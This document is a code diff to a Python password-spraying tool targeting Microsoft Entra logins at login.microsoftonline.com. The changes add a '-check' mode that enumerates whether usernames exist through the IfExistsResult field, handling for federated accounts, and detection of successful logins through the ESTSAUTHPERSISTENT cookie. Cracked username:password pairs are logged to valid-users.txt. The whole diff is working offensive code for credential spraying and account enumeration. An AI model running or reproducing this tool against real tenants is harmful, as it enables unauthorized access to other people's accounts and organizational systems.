@@ -10,6 +10,7 @@ GREEN = "\033[92m"
 RED = "\033[91m"
 RESET = "\033[0m"
 YELLOW = "\033[93m"
+BLUE = "\033[94m"
 
 def load_list(input_str):
     if os.path.isfile(input_str):
@@ -19,16 +20,17 @@ def load_list(input_str):
         return [input_str]
 
 parser = argparse.ArgumentParser(
-    description=" Spray or test Microsoft login using username(s) and password(s).",
+    description="Spray or test Microsoft login using username(s) and password(s).",
     epilog="Example usage:\n"
-           "  python3 script.py -user users.txt -pass passwords.txt\n"
-           "  python3 script.py -user username@fuck.com -pass 'A'\n",
+           "  python3 Entrra-Spray.py -user users.txt -pass passwords.txt\n"
+           "  python3 Entrra-Spray.py -user username@fuck.com -pass 'A'\n"
+           "  python3 Entrra-Spray.py -user username@domain.com -pass 'X' -check",
     formatter_class=argparse.RawTextHelpFormatter
 )
 
 parser.add_argument("-user", required=True, help="Single username or path to usernames file (TXT)")
 parser.add_argument("-pass", dest="password", required=True, help="Single password or path to passwords file (TXT)")
-
+parser.add_argument("-check", action="store_true", help="Enable check mode (checking if Ideneity Exsits in Entra)")
 
 args = parser.parse_args()
 
@@ -194,17 +196,25 @@ for username in usernames:
             "flowToken": f"{flowtoken}"
         }
 
+        if args.check:
+            with httpx.Client(http2=True) as client:
+                response = client.post(url99, headers=headers99, json=payload99)
 
-        with httpx.Client(http2=True) as client:
-            response = client.post(url99, headers=headers99, json=payload99)
+                if '"FederationRedirectUrl"' in response.text:
+                    try:
+                        federation_url = response.json().get("FederationRedirectUrl")
+                        if federation_url:
+                            print(f"{BLUE}[!] Can not enumeration if username is exist {RESET}")
+                    except Exception as e:
+                        print(f"{RED}[✗] Failed to extract FederationRedirectUrl: {e}{RESET}")
+                        pass
 
-        #print("Status Code:", response.status_code)
+                if '"IfExistsResult":0' in response.text:
+                    pass
+                else:
+                    print(f"{RED}[✗] Username: {username} not exists{RESET}")
+                    continue
 
-        if '"IfExistsResult":0' in response.text:
-            pass
-        else:
-            print(f"{RED}[✗] Username: {username} not exists{RESET}")
-            continue
     
 
         url123 = "https://login.microsoftonline.com/common/login"
@@ -251,23 +261,40 @@ for username in usernames:
         cookies_dict = dict(response123.cookies)
         #print(cookies_dict)
 
-
-        if "ESTSAUTHPERSISTENT" in cookies_dict:
-            print(f"{GREEN}[✓] SUCCESS: {username} logged in with password: {password}")
-            with open("valid-users.txt", "a") as log_file:
-                log_file.write(f"{username}:{password}\n")
-            break
-        else:
-            if "<html><head><title>Working...</title></head>" in response123.text:
-                print(f"{GREEN}[✓] SUCCESS: {username} logged in with password: {password}, with Redirect Page to..")
+        
+        if args.check:
+            if "ESTSAUTHPERSISTENT" in cookies_dict:
+                print(f"{GREEN}[✓] SUCCESS: User {username} is exist and seccessfully logged in with password: {password}")
                 with open("valid-users.txt", "a") as log_file:
                     log_file.write(f"{username}:{password}\n")
-                break
+                break            
             else:
-                print(f"{YELLOW}[!] NOT-SUCCESS: {username} exists, but password is incorrect: {password}")
+                if "<html><head><title>Working...</title></head>" in response123.text:
+                    print(f"{GREEN}[✓] SUCCESS: {username} logged in with password: {password}, with Redirect Page to..")
+                    with open("valid-users.txt", "a") as log_file:
+                        log_file.write(f"{username}:{password}\n")
+                    break
+                else:
+                    print(f"{YELLOW}[!] NOT-SUCCESS: {username} exists, but password is incorrect: {password}")
+                    with open("valid-users.txt", "a") as log_file:
+                        log_file.write(f"{username}\n")
+                    
+        else :
+            if "ESTSAUTHPERSISTENT" in cookies_dict:
+                print(f"{GREEN}[✓] SUCCESS: User {username} is exist and seccessfully logged in with password: {password}")
                 with open("valid-users.txt", "a") as log_file:
-                    log_file.write(f"{username}\n")
+                    log_file.write(f"{username}:{password}\n")
+                break            
+            else:
+                if "<html><head><title>Working...</title></head>" in response123.text:
+                    print(f"{GREEN}[✓] SUCCESS: {username} logged in with password: {password}, with Redirect Page to..")
+                    with open("valid-users.txt", "a") as log_file:
+                        log_file.write(f"{username}:{password}\n")
+                    break
+                else:
+                    print(f"{YELLOW}[!] NOT-SUCCESS to authenticate with {username}, didn't check if user exists")
+
 
             
-print(f"{RESET} seccess Logs written to valid-users.txt")
+print(f"{BLUE} seccess Logs written to valid-users.txt {RESET}")
 
